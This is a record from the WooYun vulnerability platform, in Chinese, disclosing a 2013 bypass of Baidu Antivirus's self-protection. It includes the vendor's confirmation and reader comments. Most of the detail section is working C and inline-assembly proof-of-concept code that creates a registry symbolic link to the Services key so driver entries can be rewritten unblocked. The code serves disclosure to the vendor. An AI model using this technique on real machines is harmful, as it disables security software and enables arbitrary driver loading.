{"id": 7617, "wybug_id": "wooyun-2013-036667", "wybug_title": "5绕百度杀毒任意加载驱动(POC)", "wybug_corp": "百度", "wybug_author": "n0bele", "wybug_date": "2013-09-10 15:09", "wybug_open_date": "2013-12-09 15:10", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-09：\t细节向公众公开  简要描述： 礼物收到了，感谢。最后一次了，不研究了. 详细说明：   标题是迷惑人的，其实是任意写注册表。再次利用硬链接,POC执行以后操作HKEY_LOCAL_MACHINE\\SYSTEM\\123就等于操作HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\poc(这个是原始存在的)了，而操作HKEY_LOCAL_MACHINE\\SYSTEM\\123主动防御是不拦截的,修改下ImagePath就又回到全bypass的原点了.\ntypedef struct _LSA_UNICODE_STRING {\tUSHORT Length;\tUSHORT MaximumLength;\tPWSTR Buffer;} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;typedef struct _OBJECT_ATTRIBUTES { \tULONG Length; \tHANDLE RootDirectory; \tPUNICODE_STRING ObjectName; \tULONG Attributes; \tPVOID SecurityDescriptor; \tPVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES; #define InitializeObjectAttributes( p, n, a, r, s ) { (p)->Length = sizeof( OBJECT_ATTRIBUTES );(p)->RootDirectory = r; (p)->Attributes = a;(p)->ObjectName = n;(p)->SecurityDescriptor = s;(p)->SecurityQualityOfService = NULL; }BOOL  RegHardLink(){\tBOOL bRet = FALSE;\tHMODULE hLib = NULL;\tWCHAR KeyName1[] = L\"\\\\Registry\\\\Machine\\\\System\\\\123\";\tLPCWSTR pKeyName1 = KeyName1 ;\tUNICODE_STRING KeyString ;\tOBJECT_ATTRIBUTES oba ;\tPVOID pZwCreateKey = NULL ,pZwSetValueKey = NULL ,pRtlInitUnicodeString = NULL;\tdo\t{\t\thLib = LoadLibrary(\"ntdll.dll\");\t\tif(!hLib)\t\t\tbreak;\t\tpRtlInitUnicodeString = GetProcAddress(hLib , \"RtlInitUnicodeString\");\t\tpZwCreateKey = GetProcAddress(hLib , \"ZwCreateKey\");\t\tpZwSetValueKey = GetProcAddress(hLib , \"ZwSetValueKey\");\t\tif(!pRtlInitUnicodeString || !pZwCreateKey || !pZwSetValueKey)\t\t\tbreak;\t\t__asm\t\t{\t\t\tpush pKeyName1\t\t\tlea eax , KeyString\t\t\tpush eax\t\t\tcall pRtlInitUnicodeString\t\t}\t\tInitializeObjectAttributes(&oba , &KeyString , 0X40 , 0 ,0 );\t\tULONG dispostion ;\t\tHANDLE linkhandle ;\t\tLONG stat ;\t\t__asm\t\t{\t\t\tlea eax , dispostion\t\t\tpush eax\t\t\tpush 3\t\t\tpush 0\t\t\tpush 0\t\t\tlea eax , oba\t\t\tpush eax\t\t\tpush 0x22\t\t\tlea eax , linkhandle\t\t\tpush eax\t\t\tcall pZwCreateKey\t\t\tmov stat ,eax\t\t}\t\tWCHAR KeyName2[] = L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\";\t\tPVOID pdata = KeyName2 ;\t\tULONG len = wcslen(KeyName2) * sizeof(WCHAR);\t\tWCHAR ValueName[]= L\"SymbolicLinkValue\";\t\tLPCWSTR pvaluename = ValueName ;\t\tUNICODE_STRING valuestring ;\t\t__asm\t\t{\t\t\tpush pvaluename\t\t\tlea eax , valuestring\t\t\tpush eax\t\t\tcall pRtlInitUnicodeString\t\t}\t\t__asm\t\t{\t\t\tpush len\t\t\tpush pdata\t\t\tpush 6\t\t\tpush 0\t\t\tlea eax , valuestring\t\t\tpush eax\t\t\tpush linkhandle\t\t\tcall pZwSetValueKey\t\t\tmov stat ,eax\t\t}\t\t\t}while(0);\tif(hLib)\t\tFreeLibrary(hLib);\treturn bRet;}int main(int argc, char* argv[]){\tRegHardLink();        return 0;}\n   漏洞证明：  试了就知道   修复方案：  他们懂   版权声明：转载请注明来源 n0bele@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-09-10 15:41 厂商回复： 感谢对百度安全的关注，我们已经开始进行修复，欢迎继续关注百度安全。--“百度，因你更安全” 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-10 17:44 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  好厉害…    \n     2013-10-21 08:20 |    \t\tACGT \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:4        | another script kiddie)\t\t \n  百度杀毒太弱了，这个360几年前就拦了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}